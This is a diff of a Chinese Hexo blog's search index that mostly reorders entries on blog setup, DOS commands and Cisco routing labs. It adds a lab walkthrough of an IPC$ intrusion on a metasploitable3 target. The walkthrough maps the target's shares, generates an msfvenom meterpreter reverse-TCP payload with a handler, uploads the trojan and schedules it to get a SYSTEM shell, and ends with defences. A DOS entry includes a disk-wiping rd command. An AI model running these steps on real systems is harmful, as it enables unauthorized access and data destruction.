@@ -1,45 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hexo调试-4</title>
-    <url>/2020/06/07/2020-6-7-2/</url>
-    <content><![CDATA[<p>花了将近一下午的时间，换了另外一款主题，优化了一下界面<br>现在的界面没之前那么单调了，看起来挺舒服的，纵享丝滑<br>这个主题还有预加载功能，体验极好<br>得找点图来，自带的这些图不怎么不好看</p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo调试-1</title>
-    <url>/2020/06/06/2020-6-6/</url>
-    <content><![CDATA[<p>Hexo基本搭建完成</p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo调试-5</title>
-    <url>/2020/06/07/2020-6-7-3/</url>
-    <content><![CDATA[<p>又花了几个小时，尝试了一下coding + github 双部署，又觉得coding的使用效果强差人意，还是罢了<br>还有一部分时间，调试了下右下角的这个玩意儿，选来选去，还是用现在这个好了<br>左下角还有个播放音乐的功能，我觉得还挺不错</p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>四层主机发现</title>
     <url>/2020/06/25/2020-6-25/</url>
     <content><![CDATA[<blockquote>
@@ -141,6 +102,59 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo调试-2</title>
+    <url>/2020/06/06/2020-6-6-2/</url>
+    <content><![CDATA[<p>现在可以插入图片了！！<img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/c.gif" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1.gif" alt></p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo调试-4</title>
+    <url>/2020/06/07/2020-6-7-2/</url>
+    <content><![CDATA[<p>花了将近一下午的时间，换了另外一款主题，优化了一下界面<br>现在的界面没之前那么单调了，看起来挺舒服的，纵享丝滑<br>这个主题还有预加载功能，体验极好<br>得找点图来，自带的这些图不怎么不好看</p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo调试-5</title>
+    <url>/2020/06/07/2020-6-7-3/</url>
+    <content><![CDATA[<p>又花了几个小时，尝试了一下coding + github 双部署，又觉得coding的使用效果强差人意，还是罢了<br>还有一部分时间，调试了下右下角的这个玩意儿，选来选去，还是用现在这个好了<br>左下角还有个播放音乐的功能，我觉得还挺不错</p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo调试-1</title>
+    <url>/2020/06/06/2020-6-6/</url>
+    <content><![CDATA[<p>Hexo基本搭建完成</p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo调试-3</title>
     <url>/2020/06/07/2020-6-7/</url>
     <content><![CDATA[<p>换了个NexT主题<br>挑了一个比较满意的主题风格<br>忙活了几个小时<br>已经1点了<br>是时候休息了呀</p>
@@ -154,10 +168,27 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo调试-2</title>
-    <url>/2020/06/06/2020-6-6-2/</url>
-    <content><![CDATA[<p>现在可以插入图片了！！<img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/c.gif" alt></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1.gif" alt></p>
+    <title>Hexo调试-6</title>
+    <url>/2020/06/08/2020-6-8/</url>
+    <content><![CDATA[<p>用了昨天一个晚上晚上，和今天上午几个小时，用GitHub+jsDelivr+PicGo搭建了个免费图床，感觉效果还不错，还弄了个Gitalk 评论模块，挺好看的，有个美中不足的地方，就是要Github登录之后才能评论，不过也好，还世界一片清净。</p>
+<p>对博客的访问速度优化了一下，在预加载的基础上，弄了个懒加载，<code>懒加载</code>就是:一般是当图片滚动进可视窗口内才加载图片，可视窗口之外的图片则不加载,既保证了网页的打开速度，也不会因图片的庞大体积而拖累了整个页面的加载。</p>
+<p>接下来，找点好看的图，把那些细节优化一下，弄完之后，Hexo差不多就调试完毕了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/0.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
+      <tags>
+        <tag>日常</tag>
+        <tag>调试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo调试-7</title>
+    <url>/2020/06/08/2020-6-8-2/</url>
+    <content><![CDATA[<p>找来了一些图，放在了那个自己搭的图床里，以后再用</p>
+<p>测试了一下博客的访问速度，发现访问速度还是不尽人意，看来GitHub+jsDelivr搭建的图库还是有些小卡，明天再找点教程优化一下吧，弄好之后，就可以一篇一篇的水了233</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/KKEA$V0X8F6WZJE80%7BWN_L8.jpg" alt></p>
 ]]></content>
       <categories>
         <category>调试</category>
@@ -225,100 +256,6 @@
 <p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202322.png" alt></p>
 <p><strong>恐吓小脚本</strong></p>
 <p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202553.png" alt></p>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>收录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo调试-7</title>
-    <url>/2020/06/08/2020-6-8-2/</url>
-    <content><![CDATA[<p>找来了一些图，放在了那个自己搭的图床里，以后再用</p>
-<p>测试了一下博客的访问速度，发现访问速度还是不尽人意，看来GitHub+jsDelivr搭建的图库还是有些小卡，明天再找点教程优化一下吧，弄好之后，就可以一篇一篇的水了233</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/KKEA$V0X8F6WZJE80%7BWN_L8.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo调试-6</title>
-    <url>/2020/06/08/2020-6-8/</url>
-    <content><![CDATA[<p>用了昨天一个晚上晚上，和今天上午几个小时，用GitHub+jsDelivr+PicGo搭建了个免费图床，感觉效果还不错，还弄了个Gitalk 评论模块，挺好看的，有个美中不足的地方，就是要Github登录之后才能评论，不过也好，还世界一片清净。</p>
-<p>对博客的访问速度优化了一下，在预加载的基础上，弄了个懒加载，<code>懒加载</code>就是:一般是当图片滚动进可视窗口内才加载图片，可视窗口之外的图片则不加载,既保证了网页的打开速度，也不会因图片的庞大体积而拖累了整个页面的加载。</p>
-<p>接下来，找点好看的图，把那些细节优化一下，弄完之后，Hexo差不多就调试完毕了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/0.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>调试</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DOS基本命令</title>
-    <url>/2020/06/26/DOS/</url>
-    <content><![CDATA[<h1 id="DOS基本命令"><a href="#DOS基本命令" class="headerlink" title="DOS基本命令"></a>DOS基本命令</h1><h2 id="一、DOS命令"><a href="#一、DOS命令" class="headerlink" title="一、DOS命令"></a>一、DOS命令</h2><ol>
-<li><p>color help   改变背景及字体颜色</p>
-</li>
-<li><p>cls   清屏</p>
-</li>
-<li><p>dir   查看当前文件夹下的文件</p>
-<p>文件类型中有 (DIR) 表示的是“文件夹”，否则代表“文件”</p>
-<p>dir /a 显示所有文件</p>
-</li>
-<li><p>cd   进入指定目录</p>
-<p>cd .. 返回上一级目录</p>
-<p>cd \ 退至根目录   (\代表根)</p>
-<p>cd .. \xaa 退出至上级目录后进入\xaa</p>
-<p>cd \a\xaa 进入xaa（绝对路径）</p>
-<p>切换到其他硬盘：直接输入盘符</p>
-<p>例如：E：    C：</p>
-</li>
-<li><p>md    创建文件夹/目录</p>
-<p>md 1 2 3 4 5 用空格分隔创建多个文件夹</p>
-<p>md “1 2 3 4 5 “ 引号标记其为文本格式</p>
-<p>md a\b\c\d   递归创建(套娃)</p>
-</li>
-<li><p>rd   删除<strong>文件夹/目录</strong></p>
-<p>rd 1 2 3 4 5 用空格分隔删除多个文件夹</p>
-<p>rd “1 2 3 4 5 “ 引号标记其为文本格式</p>
-<p>rd 目录 /s /q  （/s参数代表删除文件夹下所有的文件,/q代表跳过删除警告强行删除）</p>
-<p>rd \ /s/q    格盘</p>
-</li>
-<li><p>del   删除<strong>文件</strong></p>
-</li>
-<li><p>‘  &gt;  漏斗</p>
-<p>dir &gt; 1.txt   将dir命令输出结果<strong>覆盖式</strong>保存至1.txt</p>
-<p>dir &gt;&gt; 1.txt   将dir命令输出结果<strong>追加式</strong>保存至1.txt</p>
-<p>echo Oscurnb!  &gt;  1.txt 将echo回显文本保存至1.txt</p>
-<p>默认情况下&gt;和&gt;&gt;只导出<strong>正确回显</strong>，需在&gt;前添加’2’</p>
-<p>1&gt; 输出<strong>正确回显</strong>   2&gt;输出<strong>错误回显</strong>   （<strong>&gt;默认为1&gt;</strong>）</p>
-<p>rd . /s/q 2&gt;<strong>nul</strong> &gt;nul   丢弃输出数据，命令行不保留回显</p>
-</li>
-<li><p>type   打印</p>
-<p>type 1.txt   浏览文件内容</p>
-</li>
-<li><p>copy   复制</p>
-<p>move   剪切/移动</p>
-<p>ren   重命名</p>
-</li>
-<li><p>attrib   修改目录\文件属性</p>
-<p>attrib +h 1.txt    将1.txt属性添加“隐藏属性”</p>
-<p>attrib -h 1.txt    将1.txt属性取消“隐藏属性”</p>
-<p>+s    添加成”系统级文件夹”</p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>网络空间安全</category>
@@ -428,65 +365,66 @@
       </tags>
   </entry>
   <entry>
-    <title>RIP动态路由协议</title>
-    <url>/2020/06/26/RIP/</url>
-    <content><![CDATA[<h1 id="网络搭建—RIP动态路由协议"><a href="#网络搭建—RIP动态路由协议" class="headerlink" title="网络搭建—RIP动态路由协议"></a>网络搭建—RIP动态路由协议</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
-</blockquote>
-<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-1.png" alt></p>
-<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
-<pre><code>en
-config
-int f0/0
-no shutdown
-ip add 192.168.1.1 255.255.255.0
-int s0/0/0
-no shutdown
-ip add 192.168.3.1 255.255.255.0
-exit
-ip routing
-route rip
-version 2
-no auto
-network 192.168.1.0
-network 192.168.3.0</code></pre><p>R2</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.3.2 255.255.255.0
-int s0/0/1
-no shutdown
-ip add 192.168.4.2 255.255.255.0
-exit
-ip routing
-route rip
-version 2
-no auto
-network 192.168.4.0
-network 192.168.3.0</code></pre><p>R3</p>
-<pre><code>en
-config
-int s0/0/0
-no shutdown
-ip add 192.168.4.1 255.255.255.0
-int f0/0
-no shutdown
-ip add 192.168.2.1 255.255.255.0
-exit
-ip routing
-route rip
-version 2
-no auto
-network 192.168.2.0
-network 192.168.4.0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-2.png" alt></p>
+    <title>DOS基本命令</title>
+    <url>/2020/06/26/DOS/</url>
+    <content><![CDATA[<h1 id="DOS基本命令"><a href="#DOS基本命令" class="headerlink" title="DOS基本命令"></a>DOS基本命令</h1><h2 id="一、DOS命令"><a href="#一、DOS命令" class="headerlink" title="一、DOS命令"></a>一、DOS命令</h2><ol>
+<li><p>color help   改变背景及字体颜色</p>
+</li>
+<li><p>cls   清屏</p>
+</li>
+<li><p>dir   查看当前文件夹下的文件</p>
+<p>文件类型中有 (DIR) 表示的是“文件夹”，否则代表“文件”</p>
+<p>dir /a 显示所有文件</p>
+</li>
+<li><p>cd   进入指定目录</p>
+<p>cd .. 返回上一级目录</p>
+<p>cd \ 退至根目录   (\代表根)</p>
+<p>cd .. \xaa 退出至上级目录后进入\xaa</p>
+<p>cd \a\xaa 进入xaa（绝对路径）</p>
+<p>切换到其他硬盘：直接输入盘符</p>
+<p>例如：E：    C：</p>
+</li>
+<li><p>md    创建文件夹/目录</p>
+<p>md 1 2 3 4 5 用空格分隔创建多个文件夹</p>
+<p>md “1 2 3 4 5 “ 引号标记其为文本格式</p>
+<p>md a\b\c\d   递归创建(套娃)</p>
+</li>
+<li><p>rd   删除<strong>文件夹/目录</strong></p>
+<p>rd 1 2 3 4 5 用空格分隔删除多个文件夹</p>
+<p>rd “1 2 3 4 5 “ 引号标记其为文本格式</p>
+<p>rd 目录 /s /q  （/s参数代表删除文件夹下所有的文件,/q代表跳过删除警告强行删除）</p>
+<p>rd \ /s/q    格盘</p>
+</li>
+<li><p>del   删除<strong>文件</strong></p>
+</li>
+<li><p>‘  &gt;  漏斗</p>
+<p>dir &gt; 1.txt   将dir命令输出结果<strong>覆盖式</strong>保存至1.txt</p>
+<p>dir &gt;&gt; 1.txt   将dir命令输出结果<strong>追加式</strong>保存至1.txt</p>
+<p>echo Oscurnb!  &gt;  1.txt 将echo回显文本保存至1.txt</p>
+<p>默认情况下&gt;和&gt;&gt;只导出<strong>正确回显</strong>，需在&gt;前添加’2’</p>
+<p>1&gt; 输出<strong>正确回显</strong>   2&gt;输出<strong>错误回显</strong>   （<strong>&gt;默认为1&gt;</strong>）</p>
+<p>rd . /s/q 2&gt;<strong>nul</strong> &gt;nul   丢弃输出数据，命令行不保留回显</p>
+</li>
+<li><p>type   打印</p>
+<p>type 1.txt   浏览文件内容</p>
+</li>
+<li><p>copy   复制</p>
+<p>move   剪切/移动</p>
+<p>ren   重命名</p>
+</li>
+<li><p>attrib   修改目录\文件属性</p>
+<p>attrib +h 1.txt    将1.txt属性添加“隐藏属性”</p>
+<p>attrib -h 1.txt    将1.txt属性取消“隐藏属性”</p>
+<p>+s    添加成”系统级文件夹”</p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>网络搭建</category>
+        <category>网络空间安全</category>
       </categories>
       <tags>
+        <tag>网络空间安全</tag>
         <tag>收录</tag>
-        <tag>网络搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -600,6 +538,68 @@ ip routing
 route ospf 1
 network 192.168.2.0 0.0.0.255 area 0
 network 192.168.4.0 0.0.0.255 area 0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627000520.png" alt></p>
+]]></content>
+      <categories>
+        <category>网络搭建</category>
+      </categories>
+      <tags>
+        <tag>收录</tag>
+        <tag>网络搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RIP动态路由协议</title>
+    <url>/2020/06/26/RIP/</url>
+    <content><![CDATA[<h1 id="网络搭建—RIP动态路由协议"><a href="#网络搭建—RIP动态路由协议" class="headerlink" title="网络搭建—RIP动态路由协议"></a>网络搭建—RIP动态路由协议</h1><blockquote>
+<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+</blockquote>
+<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-1.png" alt></p>
+<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
+<pre><code>en
+config
+int f0/0
+no shutdown
+ip add 192.168.1.1 255.255.255.0
+int s0/0/0
+no shutdown
+ip add 192.168.3.1 255.255.255.0
+exit
+ip routing
+route rip
+version 2
+no auto
+network 192.168.1.0
+network 192.168.3.0</code></pre><p>R2</p>
+<pre><code>en
+config
+int s0/0/0
+no shutdown
+ip add 192.168.3.2 255.255.255.0
+int s0/0/1
+no shutdown
+ip add 192.168.4.2 255.255.255.0
+exit
+ip routing
+route rip
+version 2
+no auto
+network 192.168.4.0
+network 192.168.3.0</code></pre><p>R3</p>
+<pre><code>en
+config
+int s0/0/0
+no shutdown
+ip add 192.168.4.1 255.255.255.0
+int f0/0
+no shutdown
+ip add 192.168.2.1 255.255.255.0
+exit
+ip routing
+route rip
+version 2
+no auto
+network 192.168.2.0
+network 192.168.4.0</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r2-2.png" alt></p>
 ]]></content>
       <categories>
         <category>网络搭建</category>
@@ -731,6 +731,170 @@ shell@msfadmin &gt; ps aux | grep udev  查看pid</code></pre><p><img src="https
       </tags>
   </entry>
   <entry>
+    <title>ipc$命令管道入侵示例</title>
+    <url>/2020/06/26/ipc$/</url>
+    <content><![CDATA[<h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
+<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
+</blockquote>
+<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
+<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
+<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
+<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
+<p>靶机：metasploitable3-win2k8</p>
+<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
+net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
+net use \\目标IP\ipc$ /del                  删除一个ipc$连接
+net use z: /del                            删除映射的z盘
+//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
+<p>成功建立了空连接</p>
+<p>这里尝试对对方的磁盘进行映射</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
+<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
+<p>这里可以轻易访问\读写对方的磁盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
+<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
+use exploit/multi/handler   定义监听攻击模块
+set payloads windows/meterpreter/reverset_tcp   设置payload
+set lhost IP    设置渗透机ip
+set lport 端口    设置渗透机监听端口
+exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
+<blockquote>
+<p>如果出现问题请仔细看上图</p>
+</blockquote>
+<p>完成创建，木马默认生成在Kali的根目录下</p>
+<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
+<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
+<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
+at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
+<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
+<p>at \目标ip  可以验证计划任务添加情况</p>
+<blockquote>
+<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
+</blockquote>
+<p><strong>2</strong></p>
+<p><strong>分</strong></p>
+<p><strong>钟</strong></p>
+<p><strong>后</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
+<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
+<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
+<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
+<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
+<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
+<pre><code>1.基本命令
+help                       查看Meterpreter帮助
+background                 返回，把meterpreter后台挂起
+bgkill                     杀死一个背景 meterpreter 脚本
+bglist                     提供所有正在运行的后台脚本的列表
+bgrun                      作为一个后台线程运行脚本
+channel                    显示活动频道
+sessions -i number         与会话进行交互
+close                      关闭通道
+exit                       终止 meterpreter 会话
+interact id                切换进一个信道
+read                       从通道读取数据
+write                      将数据写入到一个通道
+2.文件系统命令
+upload 本地路径 目标路径      上传文件
+download 目标路径 本地路径    下载文件到本机
+edit 目标路径                编辑文件
+enumdesktops               用户登录数
+//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
+<li><strong>本地cmd中输入net share</strong></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--9.png" alt></p>
+<p>然后有几个删几个！</p>
+<pre><code>net share ipc$ /delete
+net share admin$ /delete
+net share c$ /delete</code></pre><ol start="2">
+<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
+<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
+</li>
+<li><p><strong>屏蔽139，445端口</strong></p>
+<p>方法很多，建议百度</p>
+</li>
+<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
+</li>
+</ol>
+<p>参考文献：</p>
+<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
+]]></content>
+      <categories>
+        <category>网络空间安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DHCP</title>
+    <url>/2020/06/25/dhcp/</url>
+    <content><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote>
+<p>实验平台: Cisco Packet Tracer 7.3.0</p>
+</blockquote>
+<h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p>
+<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p>
+<pre><code>en
+config
+int f0/1
+no sw
+ip add 172.16.1.254 255.255.255.0
+int f0/23
+no sw
+ip add 10.1.1.1 255.255.255.0
+service dhcp
+ip dhcp exc 172.16.1.253 172.16.1.254
+ip dhcp exc 172.16.2.253 172.16.2.254
+ip dhcp pool net1
+network 172.16.1.0 255.255.255.0
+default-router 172.16.1.254
+dns-server 10.1.2.1
+exit
+ip dhcp pool net2
+network 172.16.2.0 255.255.255.0
+default-router 172.16.2.254
+dns-server 10.1.2.1
+exit
+ip route 172.16.2.0 255.255.255.0 10.1.1.2
+ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p>
+<pre><code>en
+config
+int f0/23
+no sw
+ip add 10.1.1.2 255.255.255.0
+int f0/1
+no sw
+ip add 172.16.2.254 255.255.255.0
+exit
+service dhcp
+int f0/1
+ip helper 10.1.1.1
+exit
+ip routing
+ip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p>
+<pre><code>en
+config
+ip dhcp snooping
+int f0/1
+ip dhcp snooping trust</code></pre><p>sw4</p>
+<pre><code>en
+config
+ip dhcp snooping
+int f0/1
+ip dhcp snooping trust</code></pre>]]></content>
+      <categories>
+        <category>网络搭建</category>
+      </categories>
+      <tags>
+        <tag>收录</tag>
+        <tag>网络搭建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kali安装</title>
     <url>/2020/06/23/kali-install-1/</url>
     <content><![CDATA[<blockquote>
@@ -844,170 +1008,6 @@ apt-get clean            #清理无用的包</code></pre><hr>
 </blockquote>
 <p>到这里Kali就基本上安装完成了</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/bq-1.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>网络空间安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DHCP</title>
-    <url>/2020/06/25/dhcp/</url>
-    <content><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote>
-<p>实验平台: Cisco Packet Tracer 7.3.0</p>
-</blockquote>
-<h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p>
-<h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p>
-<pre><code>en
-config
-int f0/1
-no sw
-ip add 172.16.1.254 255.255.255.0
-int f0/23
-no sw
